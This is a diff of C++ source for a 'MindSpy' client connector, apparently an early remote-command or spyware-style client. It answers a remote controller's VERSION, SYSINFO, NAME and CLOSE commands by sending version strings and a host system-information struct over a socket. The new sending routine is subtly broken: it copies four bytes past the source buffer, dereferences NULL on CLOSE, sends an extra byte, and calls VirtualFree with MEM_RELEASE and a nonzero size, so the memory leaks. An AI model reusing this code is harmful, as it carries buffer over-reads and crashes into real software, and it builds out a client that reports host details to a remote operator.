@@ -21,14 +21,21 @@ namespace MindSpy
 		return Conectado;
 	}
 
-	bool Conector::EnviarComando(char* cmd)
+	bool Conector::EnviarComando(USHORT SizeofData, USHORT comando, char* Data)
 	{
-		return send(sckt, cmd, strlen(cmd) + 1, 0) != SOCKET_ERROR;
+		
+		char *DataToSend = (char*)VirtualAlloc(NULL, SizeofData + 4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		*(USHORT*)DataToSend = SizeofData + 4;
+		*(USHORT*)(DataToSend + 2) = comando;
+		memcpy(DataToSend+4, Data, SizeofData + 4);
+		bool r = send(sckt, DataToSend, SizeofData+4 + 1, 0) != SOCKET_ERROR;
+		VirtualFree(DataToSend, SizeofData, MEM_RELEASE);
+		return r;
 	}
 
 	int Conector::TipoComando(const char*c)
 	{
-		char Comandos[CANTIDAD_COMANDOS][16] = { "VERSION","SYSINFO" };
+		char Comandos[CANTIDAD_COMANDOS][16] = { "CLOSE", "NAME", "VERSION", "SYSINFO" };
 		for (int i = 0; i < CANTIDAD_COMANDOS; i++) {
 			if (!strcmp(Comandos[i], c)) return i;
 		}
@@ -62,29 +69,20 @@ namespace MindSpy
 
 			switch (TipoComando(Comando.c_str()))
 			{
-			case CLNT_CMDS::VERSION:
-				EnviarComando(VERSION_CLIENTE);
+			case CLNT_CMDS::VERSION: 
+				EnviarComando(strlen(VERSION_CLIENTE) + 1, CLNT_CMDS::VERSION, VERSION_CLIENTE);
 				break;
 
 			case CLNT_CMDS::SYSINFO:
-			{
-				OSVERSIONINFOA ovi;
-				ovi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
-				GetVersionExA(&ovi);
-
-				stringstream cmd;
-				Sistema sys;
-
-				/**cmd << "SYSINFO " <<
-					ovi.dwBuildNumber << " " <<
-					ovi.dwMajorVersion << " " <<
-					ovi.dwMinorVersion << " " <<
-					(int)IsWindowsServer() << " " <<
-					ObtenerMAC();*/
-				cmd.getline("SYSINFO OK", 128, 0);
-				EnviarComando(Mensaje);
+				EnviarComando(sizeof(stSystemInfo), CLNT_CMDS::SYSINFO, (char*)&sys.getInfo());
 				break;
-			}
+
+			case CLNT_CMDS::CLOSE:
+				EnviarComando(0, CLNT_CMDS::CLOSE, NULL);
+				return;
+
+			case CLNT_CMDS::NAME:
+				break;
 
 			}
 		}
